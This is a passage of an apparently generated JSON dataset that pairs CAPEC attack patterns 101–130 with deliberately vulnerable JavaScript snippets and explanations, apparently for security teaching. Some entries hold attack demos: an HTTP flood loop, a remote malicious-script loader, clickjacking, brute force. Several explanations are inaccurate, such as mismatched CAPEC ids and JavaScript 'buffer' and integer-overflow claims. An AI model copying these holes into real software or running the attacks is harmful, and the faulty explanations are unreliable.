        "capec_name": "Server Side Include (SSI) Injection",
        "code_snippet": "const http = require('http');\nconst url = require('url');\nconst fs = require('fs');\n\nhttp.createServer((req, res) => {\n  const queryObject = url.parse(req.url, true).query;\n  const filePath = `./pages/${queryObject.page}.html`;\n\n  fs.readFile(filePath, 'utf8', (err, data) => {\n    if (err) {\n      res.writeHead(404, {'Content-Type': 'text/html'});\n      res.end('404 Not Found');\n      return;\n    }\n\n    // Vulnerable to SSI Injection\n    res.writeHead(200, {'Content-Type': 'text/html'});\n    res.end(data);\n  });\n}).listen(8080);\n\nconsole.log('Server running at http://127.0.0.1:8080/');",
        "description": "This JavaScript code snippet creates a simple HTTP server using Node.js. The server reads an HTML file based on user input from the URL query parameter 'page' and serves it as a response. The code is vulnerable to Server Side Include (SSI) Injection because it directly uses user input to construct the file path without proper validation or sanitization. An attacker could exploit this by providing a malicious 'page' parameter that includes SSI directives, leading to arbitrary code execution or information disclosure. This example also highlights related weaknesses such as improper input validation (CWE-20), improper neutralization of special elements (CWE-74), and unparsed raw web content delivery (CWE-433)."
    },
    {
        "capec_id": "102",
        "capec_name": "Session Sidejacking",
        "code_snippet": "const http = require('http');\nconst server = http.createServer((req, res) => {\n  if (req.url === '/login' && req.method === 'POST') {\n    let body = '';\n    req.on('data', chunk => {\n      body += chunk.toString();\n    });\n    req.on('end', () => {\n      const credentials = JSON.parse(body);\n      // Simulate session token generation\n      const sessionToken = 'session12345';\n      res.setHeader('Set-Cookie', `sessionToken=${sessionToken}`);\n      res.end('Logged in');\n    });\n  } else if (req.url === '/dashboard') {\n    const cookies = req.headers.cookie;\n    if (cookies && cookies.includes('sessionToken=session12345')) {\n      res.end('Welcome to your dashboard');\n    } else {\n      res.end('Unauthorized');\n    }\n  } else {\n    res.end('Not Found');\n  }\n});\nserver.listen(3000, () => {\n  console.log('Server running on port 3000');\n});",
        "description": "This JavaScript code snippet creates a simple HTTP server using Node.js that handles login and dashboard requests. The login endpoint accepts POST requests with user credentials, generates a session token, and sets it in a cookie without the 'Secure' attribute. The dashboard endpoint checks for the session token in the cookies to authorize access. This code embodies the main idea of CAPEC-Session Sidejacking by transmitting sensitive information (session token) in cleartext over an unencrypted HTTP connection, making it susceptible to interception and replay attacks. The related CWEs are represented by the lack of secure transmission (CWE-319), insufficient protection of credentials (CWE-522, CWE-523), and the absence of the 'Secure' attribute in cookies (CWE-614)."
    },
    {
        "capec_id": "103",
        "capec_name": "Clickjacking",
        "code_snippet": "<html>\n<head>\n  <style>\n    iframe {\n      position: absolute;\n      top: 0;\n      left: 0;\n      width: 100%;\n      height: 100%;\n      opacity: 0;\n      z-index: 2;\n    }\n    button {\n      position: relative;\n      z-index: 1;\n    }\n  </style>\n</head>\n<body>\n  <button onclick=\"alert('Button Clicked!')\">Click Me!</button>\n  <iframe src=\"https://malicious-site.com\"></iframe>\n</body>\n</html>",
        "description": "This code snippet demonstrates a basic example of a clickjacking attack. The main idea is to trick the user into clicking a button on a seemingly benign page, but in reality, they are interacting with an invisible iframe that overlays the entire page. The iframe is set to be fully transparent (opacity: 0) and covers the entire viewport (width: 100%; height: 100%;). The button is placed underneath the iframe, so when the user attempts to click the button, they are actually clicking on the iframe, which could be a malicious site. This leverages CWE-1021 (Improper Restriction of Rendered UI Layers or Frames) by not restricting the iframe from overlaying the content, leading to user confusion and potential malicious actions."
    },
    {
        "capec_id": "104",
        "capec_name": "Cross Zone Scripting",
        "code_snippet": "function loadContent(url) {\n    var xhr = new XMLHttpRequest();\n    xhr.open('GET', url, true);\n    xhr.onreadystatechange = function() {\n        if (xhr.readyState === 4 && xhr.status === 200) {\n            var script = document.createElement('script');\n            script.innerHTML = xhr.responseText;\n            document.body.appendChild(script);\n        }\n    };\n    xhr.send();\n}\n\n// Example usage\nloadContent('http://untrusted.example.com/malicious.js');",
        "description": "This JavaScript code snippet demonstrates a Cross Zone Scripting vulnerability. The function `loadContent` fetches content from a specified URL using an XMLHttpRequest and then dynamically injects it as a script into the webpage. This bypasses security zone controls, allowing potentially malicious scripts from untrusted sources to execute with elevated privileges. The code does not validate the input URL (CWE-20), does not perform proper authorization checks (CWE-285), and executes the script with unnecessary privileges (CWE-250). Additionally, it does not encode or escape the output (CWE-116), making it susceptible to various injection attacks."
    },
    {
        "capec_id": "105",
        "capec_name": "HTTP Request Splitting",
        "code_snippet": "const http = require('http');\n\nhttp.createServer((req, res) => {\n  let userInput = req.url.split('?')[1];\n  if (userInput) {\n    // Vulnerable to HTTP Request Splitting\n    res.setHeader('Set-Cookie', `sessionId=abc123; Path=/; ${userInput}`);\n  }\n  res.end('Hello World');\n}).listen(8080, () => {\n  console.log('Server running at http://127.0.0.1:8080/');\n});",
        "description": "This JavaScript code creates an HTTP server using Node.js. The server extracts user input from the URL query string and directly includes it in the 'Set-Cookie' HTTP header without proper sanitization. This makes the code vulnerable to HTTP Request Splitting (CAPEC-33) and related weaknesses such as CWE-113 (Improper Neutralization of CRLF Sequences in HTTP Headers). An attacker could exploit this by injecting CRLF sequences into the user input, causing the server to split the HTTP response into multiple responses, potentially leading to unauthorized actions or information disclosure."
    },
    {
        "capec_id": "106",
        "capec_name": "DEPRECATED: XSS through Log Files",
        "code_snippet": "const express = require('express');\nconst app = express();\nconst fs = require('fs');\n\napp.use(express.urlencoded({ extended: true }));\n\napp.post('/submit', (req, res) => {\n  const userInput = req.body.userInput;\n  // Log user input to a file\n  fs.appendFile('server.log', `User Input: ${userInput}\\n`, (err) => {\n    if (err) throw err;\n  });\n  // Reflect user input back to the user\n  res.send(`<html><body>User Input: ${userInput}</body></html>`);\n});\n\napp.listen(3000, () => {\n  console.log('Server is running on port 3000');\n});",
        "description": "This code snippet demonstrates a vulnerable Express.js application that logs user input to a file and reflects it back to the user without proper sanitization. The `userInput` is taken from a POST request, logged to `server.log`, and then sent back in an HTML response. This embodies the main idea of the deprecated CAPEC 'XSS through Log Files' by showing how user input can be logged and then used in a way that could lead to Cross-Site Scripting (XSS) attacks. The related CWEs highlight the risks of incomplete denylist-based protection (CWE-692), improper neutralization of input (CWE-79), and the exposure of sensitive information through log files (CWE-532)."
    },
    {
        "capec_id": "107",
        "capec_name": "Cross Site Tracing",
        "code_snippet": "const xhr = new XMLHttpRequest();\nxhr.open('TRACE', 'https://example.com', true);\nxhr.onreadystatechange = function() {\n  if (xhr.readyState === 4 && xhr.status === 200) {\n    console.log(xhr.responseText);\n  }\n};\nxhr.send(null);",
        "description": "This JavaScript code snippet demonstrates a Cross Site Tracing (XST) attack. It sends an HTTP TRACE request to 'https://example.com'. If the server supports the TRACE method, it will echo back the request headers, including any cookies or authentication tokens. This can be exploited by an attacker to steal sensitive information from the victim's session. The code leverages the XMLHttpRequest object to perform the TRACE request, which is a misuse of privileged APIs (CWE-648) and can lead to protection mechanism failures (CWE-693). The response, if successful, is logged to the console, potentially exposing session cookies and other sensitive data."
    },
    {
        "capec_id": "108",
        "capec_name": "Command Line Execution through SQL Injection",
        "code_snippet": "const express = require('express');\nconst mysql = require('mysql');\nconst { exec } = require('child_process');\nconst app = express();\nconst connection = mysql.createConnection({\n  host: 'localhost',\n  user: 'root',\n  password: 'password',\n  database: 'test'\n});\n\napp.get('/execute', (req, res) => {\n  const userInput = req.query.id;\n  const query = `SELECT command FROM commands WHERE id = '${userInput}'`;\n\n  connection.query(query, (error, results) => {\n    if (error) throw error;\n    const command = results[0].command;\n    exec(command, (err, stdout, stderr) => {\n      if (err) {\n        res.send(`Error: ${stderr}`);\n        return;\n      }\n      res.send(`Output: ${stdout}`);\n    });\n  });\n});\n\napp.listen(3000, () => {\n  console.log('Server running on port 3000');\n});",
        "description": "This JavaScript code snippet demonstrates a web application using Express and MySQL that is vulnerable to command line execution through SQL injection. The application takes user input from a query parameter 'id' and constructs an SQL query without proper input validation or sanitization (CWE-89). The result of the SQL query is then used directly as an argument to the 'exec' function, which executes the command on the server's operating system (CWE-78). This chain of vulnerabilities allows an attacker to inject malicious SQL that retrieves a command from the database, which is then executed on the server, representing the main idea of the CAPEC."
    },
    {
        "capec_id": "109",
        "capec_name": "Object Relational Mapping Injection",
        "code_snippet": "const express = require('express');\nconst bodyParser = require('body-parser');\nconst { Sequelize, QueryTypes } = require('sequelize');\n\nconst app = express();\napp.use(bodyParser.urlencoded({ extended: true }));\n\nconst sequelize = new Sequelize('database', 'username', 'password', {\n  host: 'localhost',\n  dialect: 'mysql'\n});\n\napp.post('/search', async (req, res) => {\n  const userInput = req.body.search;\n  try {\n    const results = await sequelize.query(`SELECT * FROM users WHERE name = '${userInput}'`, { type: QueryTypes.SELECT });\n    res.json(results);\n  } catch (error) {\n    res.status(500).send('Database error');\n  }\n});\n\napp.listen(3000, () => {\n  console.log('Server is running on port 3000');\n});",
        "description": "This JavaScript code snippet demonstrates a vulnerable implementation of an Object Relational Mapping (ORM) injection using the Sequelize ORM in a Node.js application. The code sets up an Express server with a POST endpoint '/search' that takes user input from the request body and uses it directly in a raw SQL query. This is a classic example of SQL injection vulnerability (CWE-89) because the user input is not properly sanitized or validated (CWE-20). An attacker could exploit this by injecting malicious SQL code through the 'search' parameter, potentially gaining unauthorized access to the database. The code also highlights the improper neutralization of special elements in the data query logic (CWE-943) and demonstrates how data access is performed outside the expected data manager component (CWE-1083)."
    },
    {
        "capec_id": "110",
        "capec_name": "SQL Injection through SOAP Parameter Tampering",
        "code_snippet": "const soap = require('soap');\nconst mysql = require('mysql');\n\nconst service = {\n  MyService: {\n    MyPort: {\n      MyFunction: function(args) {\n        const userId = args.userId;\n        const connection = mysql.createConnection({\n          host: 'localhost',\n          user: 'root',\n          password: 'password',\n          database: 'mydb'\n        });\n\n        connection.connect();\n\n        // Vulnerable SQL query construction\n        const query = `SELECT * FROM users WHERE id = '${userId}'`;\n        connection.query(query, function(error, results, fields) {\n          if (error) throw error;\n          console.log(results);\n        });\n\n        connection.end();\n      }\n    }\n  }\n};\n\nconst xml = require('fs').readFileSync('myservice.wsdl', 'utf8');\nsoap.listen(server, '/wsdl', service, xml);",
        "description": "This JavaScript code snippet demonstrates a SOAP-based web service that is vulnerable to SQL Injection through SOAP Parameter Tampering. The service defines a function 'MyFunction' that takes a 'userId' parameter from the SOAP message. This parameter is directly used to construct an SQL query without proper validation or parameter binding, making it susceptible to SQL injection attacks. An attacker can manipulate the 'userId' parameter in the SOAP request to alter the SQL query's structure, potentially gaining unauthorized access to the database. This example highlights the importance of proper input validation and the use of parameterized queries to prevent SQL injection vulnerabilities."
    },
    {
        "capec_id": "111",
        "capec_name": "JSON Hijacking (aka JavaScript Hijacking)",
        "code_snippet": "function fetchData() {\n  var script = document.createElement('script');\n  script.src = 'https://vulnerable-site.com/data.json';\n  document.body.appendChild(script);\n}\n\nfunction handleData(data) {\n  console.log('Received data:', data);\n}\n\n// Simulate an attacker including this script on their malicious site\nfetchData();",
        "description": "This JavaScript code snippet demonstrates a JSON Hijacking attack. The `fetchData` function dynamically creates a script element that loads a JSON file from a vulnerable site. The JSON file is expected to contain a JavaScript object, which will be executed in the context of the attacker's site due to the Same Origin Policy loophole. The `handleData` function is a placeholder to show how the attacker might process the stolen data. This example highlights the vulnerabilities related to insufficient verification of data authenticity (CWE-345), origin validation errors (CWE-346), and client-side enforcement of server-side security (CWE-602)."
    },
    {
        "capec_id": "112",
        "capec_name": "Brute Force",
        "code_snippet": "const users = { 'user1': 'password123', 'user2': 'password456' }; // CWE-521\n\nfunction authenticate(username, password) {\n  if (users[username] && users[username] === password) {\n    return 'Access granted';\n  }\n  return 'Access denied';\n}\n\n// Brute force attack simulation\nconst usernames = ['user1', 'user2'];\nconst passwords = ['password123', 'password456', 'password789']; // CWE-330\n\nfor (let i = 0; i < usernames.length; i++) {\n  for (let j = 0; j < passwords.length; j++) {\n    console.log(`Trying ${usernames[i]}:${passwords[j]}`);\n    console.log(authenticate(usernames[i], passwords[j]));\n  }\n}",
        "description": "This JavaScript code snippet demonstrates a simple authentication mechanism that is vulnerable to brute force attacks. The 'users' object stores usernames and passwords with weak requirements (CWE-521). The 'authenticate' function checks if the provided username and password match the stored values. The brute force attack simulation iterates through a list of usernames and a list of passwords, attempting to authenticate each combination. This represents the main idea of the CAPEC, where an attacker uses trial-and-error to exhaustively explore possible secret values to gain access. The code also highlights the use of insufficiently random values (CWE-330) in the password list."
    },
    {
        "capec_id": "113",
        "capec_name": "Interface Manipulation",
        "code_snippet": "const fs = require('fs');\n\n// Vulnerable function that manipulates file system interface\nfunction manipulateFileSystem(filePath) {\n  // Improper access control: allowing arbitrary file read/write\n  fs.readFile(filePath, 'utf8', (err, data) => {\n    if (err) throw err;\n    console.log('File content:', data);\n\n    // Exposed IOCTL with insufficient access control\n    fs.writeFile(filePath, 'Modified content', (err) => {\n      if (err) throw err;\n      console.log('File has been modified');\n    });\n  });\n}\n\n// Example usage\nmanipulateFileSystem('/etc/passwd');",
        "description": "This JavaScript code snippet demonstrates a vulnerable function that manipulates the file system interface, embodying the main idea of CAPEC-225 (Interface Manipulation). The function `manipulateFileSystem` takes a file path as an argument and performs read and write operations on the file without proper access control. This can allow an adversary to read sensitive files (e.g., '/etc/passwd') and modify their content, representing CWE-1262 (Improper Access Control for Register Interface) and CWE-782 (Exposed IOCTL with Insufficient Access Control). The code highlights how improper handling of an interface can lead to security vulnerabilities, such as unauthorized access and modification of critical system files."
    },
    {
        "capec_id": "114",
        "capec_name": "Authentication Abuse",
        "code_snippet": "const users = { 'admin': 'password123' }; // CWE-287: Improper Authentication\n\nfunction authenticate(username, password) {\n  if (users[username] && users[username] === password) {\n    return true;\n  }\n  return false;\n}\n\nfunction login(username, password) {\n  if (authenticate(username, password)) {\n    console.log('Access granted');\n  } else {\n    console.log('Access denied');\n  }\n}\n\n// CWE-307: No restriction on excessive authentication attempts\nfor (let i = 0; i < 1000; i++) {\n  login('admin', 'password123');\n}\n\n// CWE-305: Authentication Bypass by Primary Weakness\n// Simulating a bypass by directly setting a session variable\nlet session = {};\nfunction bypassAuthentication() {\n  session.user = 'admin';\n  console.log('Access granted via bypass');\n}\n\nbypassAuthentication();",
        "description": "This JavaScript code snippet demonstrates several common authentication weaknesses. The `authenticate` function checks a hardcoded username and password, representing CWE-287 (Improper Authentication). The `login` function calls `authenticate` and logs access granted or denied. The for loop simulates a brute force attack by attempting to log in multiple times without restriction, illustrating CWE-307 (Improper Restriction of Excessive Authentication Attempts). Finally, the `bypassAuthentication` function directly sets a session variable to simulate an authentication bypass, representing CWE-305 (Authentication Bypass by Primary Weakness). This code embodies the main idea of CAPEC-115 (Authentication Abuse) by showing how an attacker can exploit weaknesses in the authentication mechanism to gain unauthorized access."
    },
    {
        "capec_id": "115",
        "capec_name": "Authentication Bypass",
        "code_snippet": "const express = require('express');\nconst app = express();\n\n// Middleware to check authentication\napp.use((req, res, next) => {\n  if (req.query.authenticated === 'true') {\n    next();\n  } else {\n    res.status(401).send('Unauthorized');\n  }\n});\n\n// Vulnerable route that bypasses authentication\napp.get('/admin', (req, res) => {\n  if (req.query.bypass === 'true') {\n    res.send('Access granted to admin panel');\n  } else {\n    res.status(403).send('Forbidden');\n  }\n});\n\napp.listen(3000, () => {\n  console.log('Server running on port 3000');\n});",
        "description": "This JavaScript code snippet demonstrates an authentication bypass vulnerability in an Express.js application. The middleware checks if the 'authenticated' query parameter is set to 'true' to allow access. However, the '/admin' route contains a bypass mechanism that grants access if the 'bypass' query parameter is set to 'true', regardless of the authentication status. This represents the CAPEC 'Authentication Bypass' by allowing an attacker to circumvent the authentication mechanism using an alternate path or channel (CWE-288) and weak authentication checks (CWE-1390)."
    },
    {
        "capec_id": "116",
        "capec_name": "Excavation",
        "code_snippet": "const fs = require('fs');\nconst path = require('path');\n\n// CWE-426: Untrusted Search Path\nconst userProvidedPath = process.argv[2];\nconst sensitiveFilePath = path.join(userProvidedPath, 'sensitive_info.txt');\n\n// CWE-200: Exposure of Sensitive Information to an Unauthorized Actor\nfs.readFile(sensitiveFilePath, 'utf8', (err, data) => {\n  if (err) {\n    console.error('Error reading file:', err);\n    return;\n  }\n  console.log('Sensitive Data:', data);\n});\n\n// CWE-1243: Sensitive Non-Volatile Information Not Protected During Debug\nif (process.env.DEBUG) {\n  console.log('Debug Mode: Sensitive information access is not restricted.');\n  console.log('Sensitive Data:', data);\n}",
        "description": "This JavaScript code snippet demonstrates a scenario where an adversary can exploit the system by providing an untrusted search path (CWE-426) to access sensitive information (CWE-200). The code reads a sensitive file from a user-provided path and logs its contents, potentially exposing sensitive information to unauthorized actors. Additionally, if the application is in debug mode (CWE-1243), it further exposes sensitive information without restriction. This embodies the CAPEC concept of 'Excavation,' where an adversary probes the system to extract sensitive information for malicious purposes."
    },
    {
        "capec_id": "117",
        "capec_name": "Interception",
        "code_snippet": "const http = require('http');\n\nconst options = {\n  hostname: 'example.com',\n  port: 80,\n  path: '/login',\n  method: 'POST',\n  headers: {\n    'Content-Type': 'application/x-www-form-urlencoded'\n  }\n};\n\nconst req = http.request(options, (res) => {\n  let data = '';\n  res.on('data', (chunk) => {\n    data += chunk;\n  });\n  res.on('end', () => {\n    console.log('Response:', data);\n  });\n});\n\nreq.on('error', (e) => {\n  console.error(`Problem with request: ${e.message}`);\n});\n\n// Sending sensitive information in cleartext\nconst postData = 'username=admin&password=secret';\nreq.write(postData);\nreq.end();",
        "description": "This JavaScript code snippet demonstrates a basic HTTP POST request to a server, sending sensitive information (username and password) in cleartext. This embodies the main idea of CAPEC-94 (Interception) by illustrating how an adversary could intercept sensitive data transmitted over an unencrypted channel. The code is vulnerable to CWE-319 (Cleartext Transmission of Sensitive Information) because it sends the username and password without encryption, making it susceptible to interception. Additionally, it does not ensure message integrity (CWE-924), and could be part of a larger attack involving HTTP request smuggling (CWE-444) or covert channels (CWE-514)."
    },
    {
        "capec_id": "120",
        "capec_name": "Double Encoding",
        "code_snippet": "function isValidInput(input) {\n  // Incomplete list of disallowed inputs\n  const disallowed = ['<script>', '..', '%2E'];\n  // Validate before filter\n  if (input.includes('..') || input.includes('%2E')) {\n    return false;\n  }\n  // Permissive list of allowed inputs\n  const allowed = ['a', 'b', 'c'];\n  if (allowed.includes(input)) {\n    return true;\n  }\n  // Improper handling of URL encoding\n  const decodedInput = decodeURIComponent(input);\n  if (disallowed.some(char => decodedInput.includes(char))) {\n    return false;\n  }\n  return true;\n}\n\n// Example usage\nconst userInput = '%252E%252E'; // Double encoded '..'\nconsole.log(isValidInput(userInput)); // Should return false but may return true due to double encoding",
        "description": "This JavaScript code snippet demonstrates a function `isValidInput` that attempts to validate user input against a list of disallowed and allowed inputs. The function contains several vulnerabilities related to the CAPEC description of Double Encoding and the associated CWEs. It first checks for disallowed patterns like '..' and '%2E' before decoding the input, which is an example of CWE-181 (Validate Before Filter). The list of disallowed inputs is incomplete (CWE-184), and the list of allowed inputs is too permissive (CWE-183). The function also improperly handles URL encoding (CWE-177), as it does not account for double encoding, allowing an attacker to bypass the filter by using double-encoded characters. The example usage shows how a double-encoded input '%252E%252E' (which decodes to '..') might bypass the validation, illustrating the vulnerability."
    },
    {
        "capec_id": "121",
        "capec_name": "Exploit Non-Production Interfaces",
        "code_snippet": "const express = require('express');\nconst app = express();\n\n// Debug mode flag\nconst debugMode = true;\n\n// Sample debug endpoint\nif (debugMode) {\n  app.get('/debug-info', (req, res) => {\n    // Exposing sensitive information for debugging purposes\n    res.send({\n      secretKey: '12345-ABCDE',\n      dbConnectionString: 'mongodb://user:password@localhost:27017/db'\n    });\n  });\n}\n\napp.listen(3000, () => {\n  console.log('Server is running on port 3000');\n});",
        "description": "This JavaScript code snippet represents a simple Express.js server with a debug mode flag. When the debug mode is enabled, it exposes a '/debug-info' endpoint that reveals sensitive information such as a secret key and a database connection string. This embodies the main idea of CAPEC-Non-Production Interfaces, where an adversary can exploit a debug interface unintentionally left enabled in a production environment. The related CWEs are represented by the exposure of sensitive information (CWE-489, CWE-1295) and the presence of active debug code (CWE-489)."
    },
    {
        "capec_id": "122",
        "capec_name": "Privilege Abuse",
        "code_snippet": "const express = require('express');\nconst app = express();\n\n// Mock user data\nconst users = [\n  { id: 1, username: 'admin', role: 'admin' },\n  { id: 2, username: 'user', role: 'user' }\n];\n\n// Mock sensitive data\nconst sensitiveData = 'Sensitive Information';\n\n// Middleware to check if user is authenticated\nfunction isAuthenticated(req, res, next) {\n  const userId = req.headers['user-id'];\n  const user = users.find(u => u.id == userId);\n  if (user) {\n    req.user = user;\n    next();\n  } else {\n    res.status(401).send('Unauthorized');\n  }\n}\n\n// Route to access sensitive data\napp.get('/sensitive', isAuthenticated, (req, res) => {\n  // Improper access control: any authenticated user can access sensitive data\n  res.send(sensitiveData);\n});\n\napp.listen(3000, () => {\n  console.log('Server running on port 3000');\n});",
        "description": "This JavaScript code snippet uses the Express framework to create a simple web server with a route that exposes sensitive data. The 'isAuthenticated' middleware checks if a user is authenticated based on a 'user-id' header. However, the '/sensitive' route improperly allows any authenticated user, regardless of their role, to access sensitive information. This demonstrates the CAPEC concept of 'Privilege Abuse' by showing how improper access control (CWE-284) and incorrect permission assignment (CWE-732) can lead to unauthorized access to sensitive resources."
    },
    {
        "capec_id": "123",
        "capec_name": "Buffer Manipulation",
        "code_snippet": "function vulnerableFunction(input) {\n  var buffer = new Array(10).fill(0);\n  for (var i = 0; i <= input.length; i++) {\n    buffer[i] = input.charCodeAt(i);\n  }\n  return buffer;\n}\n\n// Example usage\nvar userInput = 'A very long string that exceeds buffer size';\nconsole.log(vulnerableFunction(userInput));",
        "description": "This JavaScript code snippet demonstrates a buffer manipulation vulnerability, specifically a buffer overflow (CWE-119). The function 'vulnerableFunction' takes an input string and attempts to store its character codes into a fixed-size buffer of 10 elements. The loop iterates over the length of the input string, which can exceed the buffer's allocated size, leading to an out-of-bounds write. This can result in overwriting adjacent memory, potentially causing unexpected behavior or security issues. The code embodies the main idea of CAPEC-1000 by showing how improper handling of buffer boundaries can be exploited."
    },
    {
        "capec_id": "124",
        "capec_name": "Shared Resource Manipulation",
        "code_snippet": "const fs = require('fs');\n\nlet sharedResource = 0;\n\nfunction readSharedResource() {\n  return sharedResource;\n}\n\nfunction writeSharedResource(value) {\n  sharedResource = value;\n}\n\nfunction simulateRaceCondition() {\n  for (let i = 0; i < 1000; i++) {\n    setTimeout(() => {\n      let value = readSharedResource();\n      value += 1;\n      writeSharedResource(value);\n    }, Math.random() * 100);\n  }\n}\n\nsimulateRaceCondition();\n\nsetTimeout(() => {\n  console.log('Final value of sharedResource:', readSharedResource());\n}, 2000);",
        "description": "This JavaScript code snippet demonstrates a race condition vulnerability, which is a form of shared resource manipulation. The shared resource in this case is a simple variable `sharedResource`. Multiple asynchronous operations (simulated by `setTimeout`) read and write to this shared resource without proper synchronization. This can lead to inconsistent or corrupted data, as the operations may overlap and interfere with each other. This example embodies the main idea of CAPEC-2 (Shared Resource Manipulation) and highlights CWE-662 (Improper Synchronization) by showing how concurrent access to a shared resource can lead to unpredictable behavior."
    },
    {
        "capec_id": "125",
        "capec_name": "Flooding",
        "code_snippet": "const http = require('http');\n\nconst options = {\n  hostname: 'target-server.com',\n  port: 80,\n  path: '/',\n  method: 'GET'\n};\n\nfor (let i = 0; i < 1000000; i++) {\n  const req = http.request(options, res => {\n    res.on('data', d => {});\n  });\n\n  req.on('error', error => {\n    console.error(error);\n  });\n\n  req.end();\n}",
        "description": "This JavaScript code snippet demonstrates a basic flooding attack using HTTP requests. The code repeatedly sends a large number of GET requests to a target server ('target-server.com'). This type of attack can overwhelm the server's resources, leading to denial of service for legitimate users. The code embodies the main idea of CAPEC-404 (Flooding) by rapidly engaging in a large number of interactions with the target. It also touches on related CWEs such as CWE-770 (Allocation of Resources Without Limits or Throttling) and CWE-400 (Uncontrolled Resource Consumption), as the server may not have proper rate limiting or resource management in place to handle such a high volume of requests."
    },
    {
        "capec_id": "126",
        "capec_name": "Path Traversal",
        "code_snippet": "const http = require('http');\nconst fs = require('fs');\nconst path = require('path');\n\nconst server = http.createServer((req, res) => {\n  const basePath = path.join(__dirname, 'restricted');\n  const requestedPath = path.join(basePath, req.url);\n\n  fs.readFile(requestedPath, (err, data) => {\n    if (err) {\n      res.writeHead(404, {'Content-Type': 'text/plain'});\n      res.end('File not found');\n    } else {\n      res.writeHead(200, {'Content-Type': 'text/plain'});\n      res.end(data);\n    }\n  });\n});\n\nserver.listen(3000, () => {\n  console.log('Server running at http://localhost:3000/');\n});",
        "description": "This JavaScript code snippet creates a simple HTTP server using Node.js. The server reads files from a 'restricted' directory based on the URL requested by the client. The code constructs the file path by joining the base directory path with the requested URL path. However, it does not properly validate or sanitize the input path, making it vulnerable to path traversal attacks. An attacker could exploit this by sending requests with '../' sequences to access files outside the 'restricted' directory, potentially exposing sensitive files on the server."
    },
    {
        "capec_id": "127",
        "capec_name": "Directory Indexing",
        "code_snippet": "const http = require('http');\nconst fs = require('fs');\nconst path = require('path');\n\nconst server = http.createServer((req, res) => {\n  const filePath = path.join(__dirname, req.url);\n\n  fs.stat(filePath, (err, stats) => {\n    if (err) {\n      res.writeHead(404, { 'Content-Type': 'text/plain' });\n      res.end('Not Found');\n      return;\n    }\n\n    if (stats.isDirectory()) {\n      fs.readdir(filePath, (err, files) => {\n        if (err) {\n          res.writeHead(500, { 'Content-Type': 'text/plain' });\n          res.end('Server Error');\n          return;\n        }\n\n        res.writeHead(200, { 'Content-Type': 'text/plain' });\n        res.end(files.join('\\n'));\n      });\n    } else {\n      fs.readFile(filePath, (err, content) => {\n        if (err) {\n          res.writeHead(500, { 'Content-Type': 'text/plain' });\n          res.end('Server Error');\n          return;\n        }\n\n        res.writeHead(200, { 'Content-Type': 'text/plain' });\n        res.end(content);\n      });\n    }\n  });\n});\n\nserver.listen(3000, () => {\n  console.log('Server running at http://localhost:3000/');\n});",
        "description": "This JavaScript code snippet creates a simple HTTP server using Node.js. The server responds to incoming requests by checking if the requested path is a directory. If it is, the server lists the contents of the directory. If the path is a file, the server reads and returns the file's content. This code embodies the main idea of CAPEC-126 (Directory Indexing) by potentially exposing directory contents to unauthorized users. The related CWEs are represented as follows:\n- CWE-424: The code does not protect alternate paths, allowing directory listing.\n- CWE-425: The code does not enforce authorization checks on directory access.\n- CWE-288: The code does not require authentication for accessing directory contents.\n- CWE-285: The code does not perform authorization checks for accessing resources.\n- CWE-732: The code may expose critical resources by listing directory contents.\n- CWE-276: The default permissions may allow unintended access to files.\n- CWE-693: The code lacks protection mechanisms to prevent directory indexing."
    },
    {
        "capec_id": "128",
        "capec_name": "Integer Attacks",
        "code_snippet": "function processInput(input) {\n  let maxInt = 2147483647; // Maximum value for a 32-bit signed integer\n  let result = input + 1;\n\n  if (result > maxInt) {\n    console.log('Integer overflow detected!');\n    return;\n  }\n\n  // Further processing with the result\n  console.log('Processed result:', result);\n}\n\n// Example usage\nprocessInput(2147483647);",
        "description": "This JavaScript code snippet demonstrates an integer overflow vulnerability. The function `processInput` takes an integer input and adds 1 to it. If the input is the maximum value for a 32-bit signed integer (2147483647), adding 1 causes an integer overflow, resulting in an unexpected negative value. The code checks for this overflow condition and logs a message if detected. This snippet embodies the main idea of CAPEC-Integer Attacks, specifically CWE-190 (Integer Overflow or Wraparound), by showing how an arithmetic operation can lead to an overflow and potentially unexpected behavior."
    },
    {
        "capec_id": "129",
        "capec_name": "Pointer Manipulation",
        "code_snippet": "function vulnerableFunction(input) {\n  let buffer = new ArrayBuffer(8);\n  let view = new DataView(buffer);\n  let pointer = input;\n\n  // CWE-823: Use of Out-of-range Pointer Offset\n  if (pointer < 0 || pointer >= buffer.byteLength) {\n    console.log('Pointer out of range');\n    return;\n  }\n\n  // CWE-822: Untrusted Pointer Dereference\n  let value = view.getInt32(pointer, true);\n  console.log('Value at pointer:', value);\n\n  // CWE-476: NULL Pointer Dereference\n  if (pointer === null) {\n    console.log('NULL pointer dereference');\n    return;\n  }\n\n  // CWE-119: Improper Restriction of Operations within the Bounds of a Memory Buffer\n  view.setInt32(pointer, 1234, true);\n  console.log('Value set at pointer:', view.getInt32(pointer, true));\n}\n\n// Example usage\nvulnerableFunction(10); // Out of range\nvulnerableFunction(null); // NULL pointer\nvulnerableFunction(4); // Valid pointer",
        "description": "This JavaScript code snippet demonstrates a function that manipulates a pointer within a buffer, embodying the main idea of the CAPEC 'Pointer Manipulation'. The function takes an input pointer and performs several operations that highlight common vulnerabilities related to pointer manipulation.\n\n1. CWE-823: The code checks if the pointer is within the valid range of the buffer. If not, it logs an error message.\n2. CWE-822: The code dereferences the pointer obtained from the untrusted input and reads a value from the buffer at that location.\n3. CWE-476: The code checks if the pointer is NULL and logs an error message if it is.\n4. CWE-119: The code sets a value at the pointer location within the buffer, potentially leading to improper memory operations if the pointer is not correctly validated.\n\nThe example usage demonstrates different scenarios, including an out-of-range pointer, a NULL pointer, and a valid pointer."
    },
    {
        "capec_id": "130",
        "capec_name": "Excessive Allocation",
        "code_snippet": "function allocateExcessiveMemory(size) {\n  let arr = [];\n  try {\n    for (let i = 0; i < size; i++) {\n      arr.push(new Array(1e6).fill('A'));\n    }\n  } catch (e) {\n    console.error('Memory allocation failed:', e);\n  }\n}\n\n// Example usage: allocate a large amount of memory\nallocateExcessiveMemory(1e3);",
